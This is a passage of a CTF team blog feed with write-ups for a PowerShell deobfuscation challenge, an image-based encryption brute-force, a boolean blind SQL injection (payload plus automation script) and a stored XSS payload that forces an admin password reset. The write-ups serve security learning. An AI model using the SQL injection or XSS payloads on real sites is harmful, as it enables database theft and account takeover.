<p>Each key of the piano corresponds to a number this is easy to discover without having to even look at the code, I just added a few prints in the loop and go through the executable and enter the correct key for the piano was <strong>hhjhhjhjkjhjhf</strong><br><a data-fancybox="gallery" href="https://i.imgur.com/fXDeOab.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/fXDeOab.png" alt=""><br></a><br>The last phase is to decrypt that big base64 string with the key we got from the piano, once again we don’t even need to check the code just print the variable and you will get the last powershell script of the challenge.</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$plain</span>=@()</div><div class="line"><span class="variable">$byteString</span> = [System.Convert]::FromBase64String(<span class="variable">$text</span>)</div><div class="line"><span class="variable">$xordData</span> = $(<span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> <span class="nomarkup">-lt</span> <span class="variable">$byteString</span>.length; ) &#123;</div><div class="line">	<span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> <span class="nomarkup">-lt</span> <span class="variable">$f</span>.length; <span class="variable">$j</span>++) &#123;</div><div class="line">		<span class="variable">$plain</span>+=<span class="variable">$byteString</span>[<span class="variable">$i</span>] -bxor <span class="variable">$f</span>[<span class="variable">$j</span>]</div><div class="line">		<span class="variable">$i</span>++</div><div class="line">		<span class="keyword">if</span> (<span class="variable">$i</span> <span class="nomarkup">-ge</span> <span class="variable">$byteString</span>.Length) &#123;</div><div class="line">			<span class="variable">$j</span> = <span class="variable">$f</span>.length</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;)</div><div class="line">iex([System.Text.Encoding]::ASCII.GetString(<span class="variable">$plain</span>))</div><div class="line"><span class="built_in">Write-Host</span> iex([System.Text.Encoding]::ASCII.GetString(<span class="variable">$plain</span>))</div><div class="line"><span class="built_in">Read-Host</span> -Prompt <span class="string">"Press Enter to exit"</span></div></pre></td></tr></table></figure>
<p>Now we get another powershell script but the obfuscation on this one is real asking for a password:<br><a data-fancybox="gallery" href="https://i.imgur.com/AE3YVuy.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/AE3YVuy.png" alt=""><br></a><br>Well it wasn’t very hard to me to reverse it, if you look closely there are alot of semicolons separating each variable assignment, for instance I checked one bye one variable and the one who looked interesting was the variable <code>{;}</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">PS C:\Users\root&gt; $&#123;;&#125;</div><div class="line">iex</div></pre></td></tr></table></figure>
<p><strong>iex</strong> is an invocation, for example it can be used to run a .ps1 file, if we look closely at the end of the script we can see a very big string (in green) which is being piped into <strong>iex</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/gsm6dOQ.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/gsm6dOQ.png" alt=""><br></a><br>if we copy that big string into the terminal we can see alot of <em>[char]number</em>, to easily convert them into text we can assign it into a variable and then call it and get the password!<br><a data-fancybox="gallery" href="https://i.imgur.com/xJMeKxF.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/xJMeKxF.png" alt=""><br></a><br>As we can see the flag was the password! SECCON{P0wEr$H311}</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;&lt;br&gt;Powerful_Shell&lt;br&gt;300 points&lt;br&gt;Powerful_Shell&lt;br&gt;&lt;br&gt;Crack me.&lt;br&gt;powerful_shell.ps1-1fb3af91eafdbebf3b3efa3b84fcc10cfc
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="python" scheme="https://teamrocketist.github.io/tags/python/"/>
    
      <category term="powershell" scheme="https://teamrocketist.github.io/tags/powershell/"/>
    
      <category term="obfuscation" scheme="https://teamrocketist.github.io/tags/obfuscation/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] TPCTF2017 - Bad Encryption</title>
    <link href="https://teamrocketist.github.io/2017/12/04/Reverse-TPCTF2017-Bad-Encryption/"/>
    <id>https://teamrocketist.github.io/2017/12/04/Reverse-TPCTF2017-Bad-Encryption/</id>
    <published>2017-12-04T06:06:23.000Z</published>
    <updated>2017-12-04T06:18:01.700Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Bad Encryption<br>100<br><br>I was making an encryption program, but it is far from perfect. Instead of make the encryption work, I decided to just encrypt everything 100 times.<br><br>Author: Kevin Higgs<br><br></blockquote>

<p>We have a python program, which is little bit obfuscated with this horrible named variables:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">101</span>):</div><div class="line">    tel1l1l1l1l1l1l1lt = <span class="string">"REDACTED"</span></div><div class="line">    <span class="keyword">import</span> builtins, random</div><div class="line">    l1l1l1l1l1l1l1l = getattr(builtins, <span class="string">"__import__"</span>)</div><div class="line">    l1l1l1l1l1l1l1l = l1l1l1l1l1l1l1l(<span class="string">"PIL.Image"</span>)</div><div class="line">    l1l1l1l1l1l1l1ll1l1l1l1l1l1l1l = l1l1l1l1l1l1l1l.Image</div><div class="line">    l1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1l = l1l1l1l1l1l1l1ll1l1l1l1l1l1l1l.new(<span class="string">"RGB"</span>, (len(tel1l1l1l1l1l1l1lt), <span class="number">1</span>), <span class="string">"white"</span>)</div><div class="line">    l1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1l = l1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1l.load()</div><div class="line">    l1l1l1l1l1l1l1ll1l1l1l111l1l11 = <span class="number">0</span></div><div class="line">    <span class="keyword">for</span> l1l1l1l1l1l1l1ll1l1l1l1l1l1l11 <span class="keyword">in</span> tel1l1l1l1l1l1l1lt:</div><div class="line">        l1l1l1l1l1l1l1ll1l1l1l1l1l1l11 = ord(l1l1l1l1l1l1l1ll1l1l1l1l1l1l11)</div><div class="line">        l1l1l1l1l1l1l1ll1l1l1l1lll1l111 = random.randint(<span class="number">1</span>,<span class="number">256</span>)</div><div class="line">        l1l1l1l1l1l1l1ll1l1l1l1lll1l112 = random.randint(<span class="number">1</span>,<span class="number">256</span>)</div><div class="line">        l1l1l1l1l1l1l1ll1l1l1l1lll1l113 = random.randint(<span class="number">1</span>,<span class="number">256</span>)</div><div class="line">        l1l1l1l1l1l1l11ll1l1l1l1lll1l111 = (l1l1l1l1l1l1l1ll1l1l1l1lll1l111/<span class="number">256</span>)</div><div class="line">        l1l1l1l1l1l1l11ll1l1l1l1lll1l112 = (l1l1l1l1l1l1l1ll1l1l1l1lll1l112/<span class="number">256</span>)</div><div class="line">        l1l1l1l1l1l1l11ll1l1l1l1lll1l113 = (l1l1l1l1l1l1l1ll1l1l1l1lll1l113/<span class="number">256</span>)</div><div class="line">        l1l121l1l1l1l11ll1l1l1l1lll1l111 = l1l1l1l1l1l1l1ll1l1l1l1l1l1l11*l1l1l1l1l1l1l11ll1l1l1l1lll1l111</div><div class="line">        l1l121l1l1l1l11ll1l1l1l1lll1l112 = l1l121l1l1l1l11ll1l1l1l1lll1l111*l1l1l1l1l1l1l11ll1l1l1l1lll1l112</div><div class="line">        l1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1l[l1l1l1l1l1l1l1ll1l1l1l111l1l11,<span class="number">0</span>] = (l1l1l1l1l1l1l1ll1l1l1l1lll1l111, l1l1l1l1l1l1l1ll1l1l1l1lll1l112, round(l1l121l1l1l1l11ll1l1l1l1lll1l112*<span class="number">10</span>))</div><div class="line">        l1l1l1l1l1l1l1ll1l1l1l111l1l11 += <span class="number">1</span></div><div class="line">    l1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1l.save(<span class="string">"out"</span>+str(i)+<span class="string">".png"</span>)</div></pre></td></tr></table></figure>
<p>After fixing the code to be more readable I got this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">101</span>):</div><div class="line">    <span class="keyword">import</span> builtins, random</div><div class="line">    img = Image.new(<span class="string">"RGB"</span>, (len(flag), <span class="number">1</span>), <span class="string">"white"</span>)</div><div class="line">    pixels = img.load()</div><div class="line">    counter = <span class="number">0</span></div><div class="line">    <span class="keyword">for</span> character <span class="keyword">in</span> flag:</div><div class="line">        character = ord(character)</div><div class="line">        rand0 = random.randint(<span class="number">1</span>,<span class="number">256</span>)</div><div class="line">        rand1 = random.randint(<span class="number">1</span>,<span class="number">256</span>)</div><div class="line">        rand3 = (rand0/<span class="number">256</span>)</div><div class="line">        rand4 = (rand1/<span class="number">256</span>)</div><div class="line">        rand5 = character*rand3</div><div class="line">        rand6 = rand5*rand4</div><div class="line">        pixels[counter,<span class="number">0</span>] = (rand0, rand1, round(rand6*<span class="number">10</span>))</div><div class="line">        counter += <span class="number">1</span></div><div class="line">    img.save(<span class="string">"out"</span>+str(i)+<span class="string">".png"</span>)</div></pre></td></tr></table></figure>
<p>We can see <code>rand0</code> and <code>rand1</code> are being random generated, but they are putted directly into the image in the pixels red and blue!, by having these two we can calculate <code>round(rand6*10)</code> easily by doing some arithmetic operations, with this we can do a script that brute-forces the flag byte by byte, by comparing the blue pixels from the image with the ones we calculated:</p>
<p>The pseudo code:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">flag = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> character <span class="keyword">in</span> all_printable_characters:</div><div class="line">    <span class="keyword">for</span> pixel <span class="keyword">in</span> image:</div><div class="line">        rand0 = pixel.red</div><div class="line">        rand1 = pixel.blue</div><div class="line">        rand3 = rand0/<span class="number">256</span></div><div class="line">        rand4 = rand1/<span class="number">256</span></div><div class="line">        rand5 = ord(character)*rand3</div><div class="line">        rand6 = rand5*rand4</div><div class="line">        <span class="keyword">if</span> rand6 == pixel.blue:</div><div class="line">            flag += character</div><div class="line">            <span class="keyword">break</span></div></pre></td></tr></table></figure></p>
<p>But we ran into a problem, as the description of the challenge says sometimes the <strong>encryption doesn’t work</strong> and one of the reasons is the calculations made by the <code>rand</code> variables can be <strong>above 255</strong> (Kind of depends of the random value or the character), we know that color pixels from the images can only handle colors in the range of 0-255 (in this case python will set the pixel as 255), a byte! </p>
<p>This why the encryption does it multiple times (100) with different random values, another problem we have is once in a while <strong>multiple characters matches the same blue pixel</strong>, in these both cases we can’t know for sure if it is the character we want.</p>
<p>So my solution to this was to ignore all characters that were <strong>above 255</strong> and those that had <strong>multiple solutions</strong> to that <strong>byte position</strong> of the flag, since we have more than enough images (100) the characters we failed to find we can recheck them in the rest of the pictures.</p>
<p>The final python script I used was (note that using python3 in this challenge was absolutely necessary):</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os, sys</div><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="comment"># flag size is 38</span></div><div class="line">flags = []</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">101</span>):</div><div class="line">    flag = []</div><div class="line">    im = Image.open(<span class="string">"out%d.png"</span>%i)</div><div class="line">    width = im.size[<span class="number">0</span>] <span class="comment">#define W and H</span></div><div class="line">    height = im.size[<span class="number">1</span>]</div><div class="line">    pix = im.load()</div><div class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,width):</div><div class="line">        stop = <span class="keyword">True</span></div><div class="line">        found = <span class="number">0</span></div><div class="line">        <span class="keyword">for</span> character <span class="keyword">in</span> string.printable:</div><div class="line">            r,g,b = pix[x,<span class="number">0</span>]</div><div class="line">            rand0 = r</div><div class="line">            rand1 = g</div><div class="line">            rand3 = rand0/<span class="number">256</span></div><div class="line">            rand4 = rand1/<span class="number">256</span></div><div class="line">            rand5 = ord(character)*rand3</div><div class="line">            rand6 = rand5*rand4</div><div class="line">            <span class="keyword">if</span> round(rand6*<span class="number">10</span>) &gt;= <span class="number">255</span>:</div><div class="line">                <span class="keyword">continue</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                <span class="keyword">if</span> round(rand6*<span class="number">10</span>) == b:</div><div class="line">                    found += <span class="number">1</span></div><div class="line">                    stop = <span class="keyword">False</span></div><div class="line">                    <span class="keyword">if</span> found == <span class="number">1</span>:</div><div class="line">                        flag.append(character)</div><div class="line">                    <span class="keyword">else</span>:</div><div class="line">                        flag[x] = <span class="string">'x'</span></div><div class="line">        <span class="keyword">if</span> stop:</div><div class="line">            flag.append(<span class="string">'x'</span>)</div><div class="line">    flags.append(<span class="string">''</span>.join(flag))</div><div class="line"></div><div class="line">final_flag = list(<span class="string">'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'</span>)</div><div class="line"><span class="keyword">for</span> flag <span class="keyword">in</span> flags:</div><div class="line">    <span class="keyword">for</span> i,c <span class="keyword">in</span> enumerate(flag):</div><div class="line">        <span class="keyword">if</span> c != <span class="string">'x'</span>: </div><div class="line">            final_flag[i] = c</div><div class="line"><span class="keyword">print</span> (<span class="string">''</span>.join(final_flag))</div></pre></td></tr></table></figure>
<p>Running it</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">python3 reverse.py</div><div class="line">tpctf&#123;i_c4nt_7h1nk_0f_a_fUnny_f14g_:(&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Bad Encryption&lt;br&gt;100&lt;br&gt;&lt;br&gt;I was making an encryption program, but it is far from perfect. Instead of make the encryption 
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="bruteforce" scheme="https://teamrocketist.github.io/tags/bruteforce/"/>
    
      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
    
      <category term="tpctf2017" scheme="https://teamrocketist.github.io/tags/tpctf2017/"/>
    
      <category term="bytebybyte" scheme="https://teamrocketist.github.io/tags/bytebybyte/"/>
    
      <category term="python3" scheme="https://teamrocketist.github.io/tags/python3/"/>
    
  </entry>
  
  <entry>
    <title>[Web] TPCTF2017 - Management</title>
    <link href="https://teamrocketist.github.io/2017/12/04/Web-TPCTF2017-Management/"/>
    <id>https://teamrocketist.github.io/2017/12/04/Web-TPCTF2017-Management/</id>
    <published>2017-12-04T05:20:20.000Z</published>
    <updated>2017-12-04T05:43:19.986Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Management<br>60<br><br>I’ve created a new website so you can do all your important management. It includes users, creating things, reading things, and… well, not much else. Maybe there’s a flag?<br><br>Second instance running at 52.90.229.46:8558<br><br>tpctf{san1t1z3_y0ur_1npu7s} is not the correct flag. Look harder ;)<br>Note: the flag format is flag{}, not the usual tpctf{}<br><br>Author: Kevin Higgs<br><br></blockquote>

<p>Opening the website we can see we can choose the user:<br><a data-fancybox="gallery" href="https://i.imgur.com/z4dn6bc.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/z4dn6bc.png" alt=""><br></a></p>
<p>After doing this its shown a new form where we could read/insert into the columns data from the table users from the current user:<br><a data-fancybox="gallery" href="https://i.imgur.com/vo6FqwU.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/vo6FqwU.png" alt=""><br></a><br>We can see which <strong>sql query</strong> is being executed:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> <span class="string">`1`</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">name</span> = <span class="string">'custom-kevin'</span>;Result: 1</div></pre></td></tr></table></figure>
<p>It’s shown in the website! all inputs are being sanitized for the exception of the POST parameter number! I used Blind Sql injection to do this challenge (Boolean Based) the base payload I used was</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1`=if((<span class="keyword">SELECT</span> <span class="keyword">hex</span>(<span class="keyword">substring</span>(<span class="string">'Abc'</span>,<span class="number">1</span>,<span class="number">1</span>)))=<span class="keyword">hex</span>(<span class="keyword">substring</span>(<span class="string">'A'</span>,<span class="number">1</span>,<span class="number">1</span>)),<span class="string">`1`</span>, <span class="string">'False'</span>), <span class="string">`1</span></div></pre></td></tr></table></figure>
<p>It’s important to use <code>HEX</code> function because substring is case insensitive and would return wrong queries if we didn’t use it, notice that what is going to be shown in the page is the result of the comparison we are making in the sql query so if the comparison is true our query will show in the page <strong>Result: 1</strong> if it’s false it will return <strong>Result: 0</strong>, doing this by hand is tedious so I wrote a python script to automate the stuff:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> string</div><div class="line"></div><div class="line">url=<span class="string">'http://52.90.229.46:8558'</span></div><div class="line">TABLE_NAME = <span class="string">'SELECT hex(substring(table_name,1,%d)) FROM information_schema.tables WHERE table_schema=database() limit %d,1'</span></div><div class="line">SUBSTRING_HEX_NAME = <span class="string">"hex(substring('&#123;&#125;',1,&#123;&#125;))"</span></div><div class="line">USERS_NAME = <span class="string">'SELECT hex(substring(name,1,%d)) FROM users limit %d,1'</span></div><div class="line"></div><div class="line">name = <span class="string">''</span></div><div class="line">cookie = &#123;<span class="string">'user'</span>: <span class="string">'kevin'</span>&#125;</div><div class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">5</span>):</div><div class="line">    name = <span class="string">''</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">60</span>+<span class="number">1</span>):</div><div class="line">        stop = <span class="keyword">True</span></div><div class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> string.printable:</div><div class="line">            PAYLOAD = <span class="string">"1`=if((%s)=%s,`1`, 'False'),`9"</span> % (USERS_NAME%(i,j), SUBSTRING_HEX_NAME.format(name+l,i))<span class="comment">#SUBSTRING_NAME.format(name+l, i))</span></div><div class="line">            <span class="comment">#print PAYLOAD</span></div><div class="line">            r = requests.post(url, data=&#123;<span class="string">'number'</span>:<span class="string">'%s'</span>%PAYLOAD,<span class="string">'action'</span>:<span class="string">'Read'</span>, <span class="string">'value'</span>:<span class="string">''</span>&#125;, cookies=cookie, timeout=<span class="number">6</span>)</div><div class="line">            </div><div class="line">            <span class="keyword">if</span> <span class="string">'Result: 1'</span> <span class="keyword">in</span> r.text:</div><div class="line">                <span class="comment">#print '-----------------------------------'</span></div><div class="line">                name += l</div><div class="line">                <span class="keyword">print</span> name</div><div class="line">                stop = <span class="keyword">False</span></div><div class="line">                <span class="keyword">break</span></div><div class="line">        <span class="keyword">if</span> stop:        </div><div class="line">            <span class="keyword">break</span></div><div class="line"><span class="comment">#if(1=1,sleep(6),0)</span></div></pre></td></tr></table></figure>
<p>Running it</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">$ python management.py </div><div class="line">f</div><div class="line">fl</div><div class="line">fla</div><div class="line">flag</div><div class="line">flag&#123;</div><div class="line">flag&#123;a</div><div class="line">flag&#123;aL</div><div class="line">flag&#123;aLW</div><div class="line">flag&#123;aLW4</div><div class="line">flag&#123;aLW4y</div><div class="line">flag&#123;aLW4ys</div><div class="line">flag&#123;aLW4ys_</div><div class="line">flag&#123;aLW4ys_E</div><div class="line">flag&#123;aLW4ys_ES</div><div class="line">flag&#123;aLW4ys_ESC</div><div class="line">flag&#123;aLW4ys_ESC4</div><div class="line">flag&#123;aLW4ys_ESC4P</div><div class="line">flag&#123;aLW4ys_ESC4PE</div><div class="line">flag&#123;aLW4ys_ESC4PE_</div><div class="line">flag&#123;aLW4ys_ESC4PE_3</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3r</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rY</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYT</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1N</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!!</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!!!</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!!!!</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!!!!!</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!!!!!&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Management&lt;br&gt;60&lt;br&gt;&lt;br&gt;I’ve created a new website so you can do all your important management. It includes users, creating 
    
    </summary>
    
      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
    
    
      <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
    
      <category term="tpctf2017" scheme="https://teamrocketist.github.io/tags/tpctf2017/"/>
    
      <category term="sqli" scheme="https://teamrocketist.github.io/tags/sqli/"/>
    
      <category term="blindSqli" scheme="https://teamrocketist.github.io/tags/blindSqli/"/>
    
  </entry>
  
  <entry>
    <title>[Web] TPCTF2017 - It&#39;s Common Sense</title>
    <link href="https://teamrocketist.github.io/2017/12/04/Web-TPCTF2017-It-s-Common-Sense/"/>
    <id>https://teamrocketist.github.io/2017/12/04/Web-TPCTF2017-It-s-Common-Sense/</id>
    <published>2017-12-04T04:35:42.000Z</published>
    <updated>2017-12-04T05:21:02.874Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>It’s Common Sense<br>100<br><br>Common Sense Reviews was fixed last night. If you believe you had a working sol. last night but did not receive an email, please retry that solution. One major issue was email sending.<br><br>We found this site: Common Sense Reviews<br><br>We think the site owners are related to Pirates. Please retrieve the admin password.<br><br>This challenge is not working right now, it should be back soon. If not, we will remove points received from it.This challenge should be working properly now. Expect a delay in receiving emails (approx. 3 minutes max?).<br><br>Author: Steven Su<br><br></blockquote>

<p>A XSS challenge, we do have a <strong>register form</strong> and a <strong>login page</strong>, after signing up we can visit two forms in the <strong>account page</strong>, one is to <strong>sent a review</strong> to the admin, and the other is to <strong>reset the password</strong> (the new password was send to the email submitted in the form).</p>
<p>My first intuition was to try easiest thing that is to steal the session cookie, unfortunately this wouldn’t work because the session cookie was protected with a <strong>http only</strong> flag, which <strong>prevents</strong> it from being stolen with XSS. The solution was to instead of trying to get the cookies we can make the admin to <strong>submit the password reset form</strong>! We can do this this with <strong>Ajax/Jquery</strong></p>
<p>The first line of the code is to import <code>Jquery</code>:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="javascript">$( <span class="built_in">document</span> ).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></div><div class="line"><span class="javascript">	$.ajax(&#123;</span></div><div class="line"><span class="javascript">	    type: <span class="string">"POST"</span>,</span></div><div class="line"><span class="javascript">	    url: <span class="string">"/account"</span>,</span></div><div class="line"><span class="javascript">	    data: <span class="string">'email=s2020685%40mvrht.net&amp;formbtn=Send%20Request'</span>,</span></div><div class="line"><span class="javascript">	    success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span></div><div class="line"><span class="javascript">	        <span class="built_in">console</span>.log(<span class="string">'success'</span>);</span></div><div class="line"><span class="undefined">	    &#125;</span></div><div class="line"><span class="undefined">	&#125;);</span></div><div class="line"><span class="undefined">&#125;);</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<p>Submitting the form like this:<br><a data-fancybox="gallery" href="https://i.imgur.com/mpvECw9.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/mpvECw9.png" alt=""><br></a><br>If we check our own review we can notice that the post request is being done correctly and the log message success is printed in the js console:<br><a data-fancybox="gallery" href="https://i.imgur.com/g81VCRj.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/g81VCRj.png" alt=""><br></a></p>
<p>After a while we would receive an email with the flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Congratulations! Normally, you would&apos;ve reset the administrators password. For the purposes of this challenge, the flag is tpctf&#123;D1D_Y0U_N0t1c3_Common_Sense_Reviews_1s_P4R7_0F_CSRF_19210jka010920aff&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;It’s Common Sense&lt;br&gt;100&lt;br&gt;&lt;br&gt;Common Sense Reviews was fixed last night. If you believe you had a working sol. last night 
    
    </summary>
    
      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
    
    
      <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
    
      <category term="tpctf2017" scheme="https://teamrocketist.github.io/tags/tpctf2017/"/>
    
      <category term="xss" scheme="https://teamrocketist.github.io/tags/xss/"/>
    
      <category term="passwordreset" scheme="https://teamrocketist.github.io/tags/passwordreset/"/>
    
      <category term="jquery" scheme="https://teamrocketist.github.io/tags/jquery/"/>
    
  </entry>
  
  <entry>
